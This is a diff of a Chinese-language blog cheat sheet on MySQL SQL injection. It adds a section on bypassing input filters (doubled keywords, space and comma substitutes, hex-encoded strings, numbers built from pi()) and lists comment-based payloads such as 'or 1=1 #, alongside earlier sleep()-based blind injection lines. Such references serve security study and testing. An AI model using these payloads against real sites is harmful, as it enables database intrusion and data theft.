@@ -20,7 +20,7 @@
 <meta property="og:image" content="https://i.loli.net/2021/04/26/AxWCeFVRBES7plz.png">
 <meta property="og:image" content="https://i.loli.net/2021/04/26/hmOj8uBfU2PEiRq.png">
 <meta property="article:published_time" content="2021-04-26T05:52:52.000Z">
-<meta property="article:modified_time" content="2021-04-26T11:34:24.728Z">
+<meta property="article:modified_time" content="2021-04-26T12:29:36.752Z">
 <meta property="article:author" content="Du1">
 <meta property="article:tag" content="SQL">
 <meta name="twitter:card" content="summary">
@@ -115,7 +115,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Union-Based"><span class="toc-number">1.1.</span> <span class="toc-text">Union Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD-column-%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">判断 column 数及回显数据字段位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E3%80%81%E8%A1%A8%E3%80%81%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">爆库、表、字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Error Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-overflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用 overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bigint-%E6%95%B0%E5%80%BC%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">bigint 数值操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-xpath"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用 xpath</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">extractvalue (长度限制32位)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">updatexml (长度限制32位)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%8A%A5%E9%94%99-%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">利用虚拟表报错 &#x2F; 主键重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">利用几何函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用不存在的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-name-const"><span class="toc-number">1.2.6.</span> <span class="toc-text">利用 name_const</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uuid-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.</span> <span class="toc-text">uuid 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GTID-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.8.</span> <span class="toc-text">GTID 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#join-using-%E6%B3%A8%E5%88%97%E5%90%8D"><span class="toc-number">1.2.9.</span> <span class="toc-text">join using 注列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.10.</span> <span class="toc-text">ST 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.2.11.</span> <span class="toc-text">报错函数速查表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-Based"><span class="toc-number">1.3.</span> <span class="toc-text">Blind Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Boolean%EF%BC%881-or-0%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">Boolean（1 or 0）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">Time（无回显）</span></a></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Union-Based"><span class="toc-number">1.1.</span> <span class="toc-text">Union Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD-column-%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">判断 column 数及回显数据字段位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E3%80%81%E8%A1%A8%E3%80%81%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">爆库、表、字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Error Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-overflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用 overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bigint-%E6%95%B0%E5%80%BC%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">bigint 数值操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-xpath"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用 xpath</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">extractvalue (长度限制32位)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">updatexml (长度限制32位)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%8A%A5%E9%94%99-%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">利用虚拟表报错 &#x2F; 主键重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">利用几何函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用不存在的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-name-const"><span class="toc-number">1.2.6.</span> <span class="toc-text">利用 name_const</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uuid-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.</span> <span class="toc-text">uuid 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GTID-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.8.</span> <span class="toc-text">GTID 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#join-using-%E6%B3%A8%E5%88%97%E5%90%8D"><span class="toc-number">1.2.9.</span> <span class="toc-text">join using 注列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.10.</span> <span class="toc-text">ST 相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.2.11.</span> <span class="toc-text">报错函数速查表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind-Based"><span class="toc-number">1.3.</span> <span class="toc-text">Blind Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Boolean%EF%BC%881-or-0%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">Boolean（1 or 0）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">Time（无回显）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Common-Bypass"><span class="toc-number">1.4.</span> <span class="toc-text">Common Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#and-or"><span class="toc-number">1.4.1.</span> <span class="toc-text">and &#x2F; or</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.4.2.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.4.3.</span> <span class="toc-text">括号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%97%E5%8F%B7"><span class="toc-number">1.4.4.</span> <span class="toc-text">逗号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.4.5.</span> <span class="toc-text">其他系统关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4-%E6%8B%A6%E6%88%AA-%E8%BD%AC%E4%B9%89"><span class="toc-number">1.4.6.</span> <span class="toc-text">单双引号被过滤 &#x2F; 拦截 &#x2F; 转义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97"><span class="toc-number">1.4.7.</span> <span class="toc-text">数字</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83"><span class="toc-number">1.5.</span> <span class="toc-text">其它</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-number">1.5.1.</span> <span class="toc-text">注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">常用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">运算符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">系统信息函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">进制转换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%88%AA%E5%8F%96-%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">字符截取&#x2F;拼接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">常见全局变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.5.2.6.</span> <span class="toc-text">其他常用函数 &#x2F; 语句</span></a></li></ol></li></ol></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -471,6 +471,385 @@
 <li><code>id=87 and if(length(user())&gt;100, sleep(10), 1)=1</code></li>
 <li><code>id=87 and if(ascii(mid(user(),1,1))&gt;100, sleep(10), 1)=1</code></li>
 </ul>
+<h2 id="Common-Bypass"><a href="#Common-Bypass" class="headerlink" title="Common Bypass"></a>Common Bypass</h2><h3 id="and-or"><a href="#and-or" class="headerlink" title="and / or"></a>and / or</h3><ol>
+<li>双写 anandd、oorr</li>
+<li>使用运算符代替 &amp;&amp;、||</li>
+<li>直接拼接 = 号，such as <code>?id=1=(condition)</code></li>
+<li>其他方法，such as <code>?id=1^(condition)</code></li>
+<li>大小写</li>
+<li>urlencode</li>
+</ol>
+<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><ol>
+<li>多层空格嵌套</li>
+<li>改用 +</li>
+<li>使用注释 /**/</li>
+<li>and / or 后面可以跟上偶数个 !、~ 可以替代空格，也可以混合使用（规律又不同）</li>
+<li><code>%09, %0a, %0b, %0c, %0d, %a0</code> 等部分不可见字符可也代替空格</li>
+</ol>
+<p>such as <code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p>
+<h3 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h3><ul>
+<li>order by 大小比较盲注</li>
+</ul>
+<p>不懂QAQ，求教</p>
+<h3 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h3><ol>
+<li>改用盲注</li>
+<li><code>UNION SELECT 1,2,3</code> =&gt; <code>UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)</code></li>
+<li><code>mid(user(), 1, 1)</code> =&gt; <code>mid(user() from 1 for 1)</code></li>
+<li><code>LIMIT N, M</code> =&gt; <code>LIMIT M OFFSET N</code></li>
+</ol>
+<h3 id="其他系统关键字"><a href="#其他系统关键字" class="headerlink" title="其他系统关键字"></a>其他系统关键字</h3><ol>
+<li>双写绕过关键字过滤</li>
+<li>使用同义函数 / 语句代替，如 if 函数可用<code>case when condition then 1 else 0 end</code>语句代替</li>
+<li>大小写</li>
+<li>urlencode</li>
+</ol>
+<h3 id="单双引号被过滤-拦截-转义"><a href="#单双引号被过滤-拦截-转义" class="headerlink" title="单双引号被过滤 / 拦截 / 转义"></a>单双引号被过滤 / 拦截 / 转义</h3><ol>
+<li>需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入</li>
+<li>不需要跳出单引号的情况：字符串可用十六进制表示，也可通过进制转换函数表示成其他进制，汝 base_con</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">十进制转换成二进制<br>select bin(5);<br>十进制转换成八进制<br>select oct(5);<br>十进制转换成十六进制<br>select hex(5);<br>二进制转换成十进制<br>select conv(&#39;101&#39;,2,10);<br>十进制转换成十六进制<br>select conv(&#39;20&#39;,10,16);<br>还原十六进制<br>unhex(conv(DEC_DATA,10,16))<br></code></pre></td></tr></table></figure>
+
+<h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><table>
+<thead>
+<tr>
+<th>代替字符</th>
+<th>数</th>
+<th>代替字符</th>
+<th>数</th>
+<th>字</th>
+<th>代替字符</th>
+<th>数</th>
+<th>字</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>false、!pi()</td>
+<td>0</td>
+<td>ceil(pi()*pi())</td>
+<td>10</td>
+<td>A</td>
+<td>ceil((pi()+pi())*pi())</td>
+<td>20</td>
+<td>K</td>
+</tr>
+<tr>
+<td>true、!(!pi())</td>
+<td>1</td>
+<td>ceil(pi()*pi())+true</td>
+<td>11</td>
+<td>B</td>
+<td>ceil(ceil(pi())*version())</td>
+<td>21</td>
+<td>L</td>
+</tr>
+<tr>
+<td>true+true</td>
+<td>2</td>
+<td>ceil(pi()+pi()+version())</td>
+<td>12</td>
+<td>C</td>
+<td>ceil(pi()*ceil(pi()+pi()))</td>
+<td>22</td>
+<td>M</td>
+</tr>
+<tr>
+<td>floor(pi())、~~pi()</td>
+<td>3</td>
+<td>floor(pi()*pi()+pi())</td>
+<td>13</td>
+<td>D</td>
+<td>ceil((pi()+ceil(pi()))*pi())</td>
+<td>23</td>
+<td>N</td>
+</tr>
+<tr>
+<td>ceil(pi())</td>
+<td>4</td>
+<td>ceil(pi()*pi()+pi())</td>
+<td>14</td>
+<td>E</td>
+<td>ceil(pi())*ceil(version())</td>
+<td>24</td>
+<td>O</td>
+</tr>
+<tr>
+<td>floor(version()) //注意版本</td>
+<td>5</td>
+<td>ceil(pi()*pi()+version())</td>
+<td>15</td>
+<td>F</td>
+<td>floor(pi()*(version()+pi()))</td>
+<td>25</td>
+<td>P</td>
+</tr>
+<tr>
+<td>ceil(version())</td>
+<td>6</td>
+<td>floor(pi()*version())</td>
+<td>16</td>
+<td>G</td>
+<td>floor(version()*version())</td>
+<td>26</td>
+<td>Q</td>
+</tr>
+<tr>
+<td>ceil(pi()+pi())</td>
+<td>7</td>
+<td>ceil(pi()*version())</td>
+<td>17</td>
+<td>H</td>
+<td>ceil(version()*version())</td>
+<td>27</td>
+<td>R</td>
+</tr>
+<tr>
+<td>floor(version()+pi())</td>
+<td>8</td>
+<td>ceil(pi()*version())+true</td>
+<td>18</td>
+<td>I</td>
+<td>ceil(pi()*pi()*pi()-pi())</td>
+<td>28</td>
+<td>S</td>
+</tr>
+<tr>
+<td>floor(pi()*pi())</td>
+<td>9</td>
+<td>floor((pi()+pi())*pi())</td>
+<td>19</td>
+<td>J</td>
+<td>floor(pi()*pi()*floor(pi()))</td>
+<td>29</td>
+<td>T</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#<br>--<br>&#x2F;*(MySQL-5.1)<br>&#x2F;**&#x2F;(一个 *&#x2F; 可以闭合前面多个&#x2F;*)<br>;%00(PDO支援多語句)<br>&#96;(MySQL &lt;&#x3D; 5.5)<br>&#39;or 1&#x3D;1;%00<br>&#39;or 1&#x3D;1 union select 1,2&#96;&#39;<br>&#39;or 1&#x3D;1 #<br>&#39;&#x2F;*!50000or*&#x2F; 1&#x3D;1 -- -      &#x2F;&#x2F;版本号为5.1.38时只要小于50138<br>&#39;&#x2F;*!or*&#x2F; 1&#x3D;1 -- -<br></code></pre></td></tr></table></figure>
+
+<h3 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h3><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><table>
+<thead>
+<tr>
+<th>运算符</th>
+<th>说明</th>
+<th>运算符</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&amp;&amp;</td>
+<td>与，同and</td>
+<td>||</td>
+<td>或，同or</td>
+</tr>
+<tr>
+<td>!</td>
+<td>非，同not</td>
+<td>~</td>
+<td>一元比特反转</td>
+</tr>
+<tr>
+<td>^</td>
+<td>异或，同xor</td>
+<td>+</td>
+<td>加，可替代空格，如 <code>select+user()</code></td>
+</tr>
+</tbody></table>
+<h4 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h4><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>USER()</td>
+<td>获取当前操作句柄的用户名，同 SESSION_USER()、CURRENT_USER()，有时也用 SYSTEM_USER()</td>
+</tr>
+<tr>
+<td>DATABASE()</td>
+<td>获取当前选择的数据库名，同 SCHEMA()</td>
+</tr>
+<tr>
+<td>VERSION()</td>
+<td>获取当前版本信息</td>
+</tr>
+</tbody></table>
+<h4 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h4><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ORD(str)</td>
+<td>返回字符串第一个字符的ASCII值</td>
+</tr>
+<tr>
+<td>OCT(N)</td>
+<td>以字符串形式返回 <code>N</code> 的八进制数，<code>N</code> 是一个BIGINT 型数值，作用相当于<code>CONV(N,10,8)</code></td>
+</tr>
+<tr>
+<td>HEX(N_S)</td>
+<td>参数为字符串时，返回 <code>N_or_S</code> 的16进制字符串形式，为数字时，返回其16进制数形式</td>
+</tr>
+<tr>
+<td>UNHEX(str)</td>
+<td><code>HEX(str)</code> 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符</td>
+</tr>
+<tr>
+<td>BIN(N)</td>
+<td>返回十进制数值 <code>N</code> 的二进制数值的字符串表现形式</td>
+</tr>
+<tr>
+<td>ASCII(str)</td>
+<td>同<code>ORD(string)</code></td>
+</tr>
+<tr>
+<td>CONV(N,from_base,to_base)</td>
+<td>将数值型参数 <code>N</code> 由初始进制 <code>from_base</code> 转换为目标进制 <code>to_base</code> 的形式并返回</td>
+</tr>
+<tr>
+<td>CHAR(N,… [USING charset_name])</td>
+<td>将每一个参数 <code>N</code> 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串</td>
+</tr>
+</tbody></table>
+<h4 id="字符截取-拼接"><a href="#字符截取-拼接" class="headerlink" title="字符截取/拼接"></a>字符截取/拼接</h4><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SUBSTR(str,N_start,N_length)</td>
+<td>对指定字符串进行截取，为SUBSTRING的简单版</td>
+</tr>
+<tr>
+<td>SUBSTRING()</td>
+<td>多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code></td>
+</tr>
+<tr>
+<td>RIGHT(str,len)</td>
+<td>对指定字符串从最右边截取指定长度</td>
+</tr>
+<tr>
+<td>LEFT(str,len)</td>
+<td>对指定字符串从最左边截取指定长度</td>
+</tr>
+<tr>
+<td>RPAD(str,len,padstr)</td>
+<td>在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度</td>
+</tr>
+<tr>
+<td>LPAD(str,len,padstr)</td>
+<td>与RPAD相似，在<code>str</code>左边补齐</td>
+</tr>
+<tr>
+<td>MID(str,pos,len)</td>
+<td>同于 <code>SUBSTRING(str,pos,len)</code></td>
+</tr>
+<tr>
+<td>INSERT(str,pos,len,newstr)</td>
+<td>在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数</td>
+</tr>
+<tr>
+<td>CONCAT(str1,str2…)</td>
+<td>函数用于将多个字符串合并为一个字符串</td>
+</tr>
+<tr>
+<td>GROUP_CONCAT(…)</td>
+<td>返回一个字符串结果，该结果由分组中的值连接组合而成</td>
+</tr>
+<tr>
+<td>MAKE_SET(bits,str1,str2,…)</td>
+<td>根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code></td>
+</tr>
+</tbody></table>
+<h4 id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h4><table>
+<thead>
+<tr>
+<th>变量</th>
+<th>说明</th>
+<th>变量</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>@@VERSION</td>
+<td>返回版本信息</td>
+<td>@@HOSTNAME</td>
+<td>返回安装的计算机名称</td>
+</tr>
+<tr>
+<td>@@GLOBAL.VERSION</td>
+<td>同<code>@@VERSION</code></td>
+<td>@@BASEDIR</td>
+<td>返回MYSQL绝对路径</td>
+</tr>
+</tbody></table>
+<p>可以用 <code>SHOW GLOBAL VARIABLES;</code> 查看全部全局变量</p>
+<h4 id="其他常用函数-语句"><a href="#其他常用函数-语句" class="headerlink" title="其他常用函数 / 语句"></a>其他常用函数 / 语句</h4><table>
+<thead>
+<tr>
+<th>函数/语句</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LENGTH(str)</td>
+<td>返回字符串的长度</td>
+</tr>
+<tr>
+<td>PI()</td>
+<td>返回π的具体数值</td>
+</tr>
+<tr>
+<td>REGEXP “statement”</td>
+<td>正则匹配数据，返回值为布尔值</td>
+</tr>
+<tr>
+<td>LIKE “statement”</td>
+<td>匹配数据，%代表任意内容。返回值为布尔值</td>
+</tr>
+<tr>
+<td>RLIKE “statement”</td>
+<td>与regexp相同</td>
+</tr>
+<tr>
+<td>LOCATE(substr,str,[pos])</td>
+<td>返回子字符串第一次出现的位置</td>
+</tr>
+<tr>
+<td>POSITION(substr IN str)</td>
+<td>等同于 <code>LOCATE()</code></td>
+</tr>
+<tr>
+<td>LOWER(str)</td>
+<td>将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code></td>
+</tr>
+<tr>
+<td>UPPER(str)</td>
+<td>将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code></td>
+</tr>
+<tr>
+<td>ELT(N,str1,str2,str3,…)</td>
+<td>与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值</td>
+</tr>
+<tr>
+<td>NULLIF(expr1,expr2)</td>
+<td>若expr1与expr2相同，则返回expr1，否则返回NULL</td>
+</tr>
+<tr>
+<td>CHARSET(str)</td>
+<td>返回字符串使用的字符集</td>
+</tr>
+<tr>
+<td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td>
+<td>使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code></td>
+</tr>
+</tbody></table>
+<hr>
 
   </div>
 </article>
@@ -500,7 +879,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Union-Based"><span class="toc-number">1.1.</span> <span class="toc-text">Union Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD-column-%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">判断 column 数及回显数据字段位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E3%80%81%E8%A1%A8%E3%80%81%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">爆库、表、字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Error 